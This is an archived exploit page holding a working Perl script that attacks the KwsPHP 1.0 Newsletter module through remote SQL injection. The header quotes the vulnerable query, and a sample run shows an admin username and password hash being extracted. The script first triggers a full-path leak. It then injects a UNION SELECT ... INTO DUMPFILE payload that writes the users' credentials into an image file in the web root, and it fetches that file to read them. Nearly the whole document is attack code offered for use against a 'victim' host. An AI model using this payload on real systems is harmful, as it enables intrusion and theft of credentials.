<html><head><title>KwsPHP 1.0 Newsletter Module Remote SQL Injection Exploit</title></head><pre>##################################################
#	Script....................................: KwsPHP  ver 1.0 Newsletter Module
#	Script Site...........................: http://www.kwsphp.org
#	Vulnerability........................: Remote SQL injection Exploit
#	Access..................................: Remote
#	level......................................: Dangerous
#	Author..................................: S4mi 
#	Contact.................................: S4mi[at]LinuxMail.org 
##################################################
#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, r0_0t, ddx39 .....
#
##################################################
#This Exploit Only When magic_quotes_gpc Is OFF
#Vuln Files:
#\modules\newsletter\index.php
#               [code]
#
# line: 94	$req = reqmysql('SELECT pseudo,email FROM users WHERE email=&quot;'.$newsletter.'&quot;') ;
# line: 95	$rep1 = mysql_fetch_object($req) ;
#                
#                  [/code]
#
#**************************************************************************

#Screen shot
#----------------
#C:\&gt;KwsPHP.pl 127.0.0.1 /KwsPHP/

# Connecting .....[OK]
# Sending Data ...[OK]

#+ Getting the Full path.
#+ ---------------- +
#+ path: c:\public_html\kwsphp\

# Connecting .....[OK]
# Sending Data ...[OK]

#+ Getting the injected code.
#+ ---------------- +
#127.0.0.1/KwsPHP//index.php?mod=newsletter&amp;avert_news=1&amp;newsletter=&quot;union all select pseudo,concat(CHAR(58),CHAR(58),pass,CHAR(44)) from users where id=1 INTO DUMPFILE 'c:/public_html/kwsphp/images/l3eez.gif'/*
#+ ---------------- +

#+ injecting database.
#+ ---------------- +
#+ Done!

# Connecting .....[OK]
# Sending Data ...[OK]

#+ Getting user info.
#+ ---------------- +
#+ username: admin1
#+ Password: e10adc3949ba59abbe56e057f20f883e

#C:\&gt;

###################################################

#!/usr/bin/perl

use IO::Socket ;

&amp;header();

&amp;usage unless(defined($ARGV[0] &amp;&amp; $ARGV[1] ));

$host = $ARGV[0];
$path = $ARGV[1];

#print &quot;User Name: &quot;;
#$user = &lt;STDIN&gt;;
#chop ($user);

syswrite STDOUT ,&quot;\n Connecting ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
								
die &quot;\n Unable to connect to $host\n&quot; unless($sock);

syswrite STDOUT, &quot;[OK]&quot;;

syswrite STDOUT ,&quot;\n Sending Data ...&quot;;

print $sock &quot;GET $path/index.php?mod=newsletter&amp;avert_news=1&amp;newsletter=\&quot; HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n&quot;;
print $sock &quot;Cache-Control: no-cache\n&quot;;
print $sock &quot;Connection: Close\n\n&quot;;
syswrite STDOUT ,&quot;[OK]\n\n&quot;;

while($answer = &lt;$sock&gt;){

if ($answer =~ /in &lt;b&gt;(.*?)\modul(.*?)92/){
print &quot;+ Getting the Full path.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ path: $1\n&quot;;

# here we need to replace the  &quot;\&quot; by &quot;/&quot;  in the  $1 for the Windoz Servers (didn't 
$localpath = $1;
$fullpath = $localpath.&quot;images/l3eez.gif&quot;;
}

else
{
	print &quot;\Can't find the full path\n&quot;;
	exit(0);
}
}

$inject = &quot;union all select pseudo,concat(CHAR(58),CHAR(58),pass,CHAR(44)) from users where id=1 INTO DUMPFILE '$fullpath'/*&quot;;

syswrite STDOUT ,&quot;\n Connecting ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
								
die &quot;\n Unable to connect to $host\n&quot; unless($sock);

syswrite STDOUT, &quot;[OK]&quot;;

syswrite STDOUT ,&quot;\n Sending Data ...&quot;;
print $sock &quot;GET $path/index.php?mod=newsletter&amp;avert_news=1&amp;newsletter=\&quot;$inject HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n&quot;;
print $sock &quot;Cache-Control: no-cache\n&quot;;
print $sock &quot;Connection: Close\n\n&quot;;
syswrite STDOUT ,&quot;[OK]\n\n&quot;;


print &quot;+ Getting the injected code.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;$host$path/index.php?mod=newsletter&amp;avert_news=1&amp;newsletter=\&quot;$inject \n&quot;;
print &quot;+ ---------------- +\n\n&quot;;
print &quot;+ injecting database.\n&quot;;
print &quot;+ ---------------- +\n&quot;;


#here need to connect to the new created file created from the sql injection (user::password,)
syswrite STDOUT ,&quot;\n Connecting ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
								
die &quot;\n Unable to connect to $host\n&quot; unless($sock);

syswrite STDOUT, &quot;[OK]&quot;;

syswrite STDOUT ,&quot;\n Sending Data ...&quot;;

print $sock &quot;GET $path/images/l3eez.gif HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n&quot;;
print $sock &quot;Cache-Control: no-cache\n&quot;;
print $sock &quot;Connection: Close\n\n&quot;;
syswrite STDOUT ,&quot;[OK]\n\n&quot;;


while($answer = &lt;$sock&gt;){

if ($answer =~ /(.*?)::(.*?),/){
print &quot;+ Getting user info.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ username: $1\n&quot;;
print &quot;+ Password: $2\n&quot;;
}
}

sub usage{
	print &quot;\nUsage   : perl $0 host /path/ &quot;;
	print &quot;\nExemple : perl $0 www.victim.com /KwsPHP/\n&quot;;
	exit(0);
}
sub header(){
print q(
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#	Script......................: KwsPHP  ver 1.0 Newsletter Module
#	Script Site.................: http://www.kwsphp.org
#	Vulnerability...............: Remote SQL injection Exploit
#	Access......................: Remote
#	level.......................: Dangerous
#	Author......................: S4mi 
#	Contact.....................: S4mi[at]LinuxMail.org 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
);
}

# milw0rm.com [2007-10-11]</pre></html>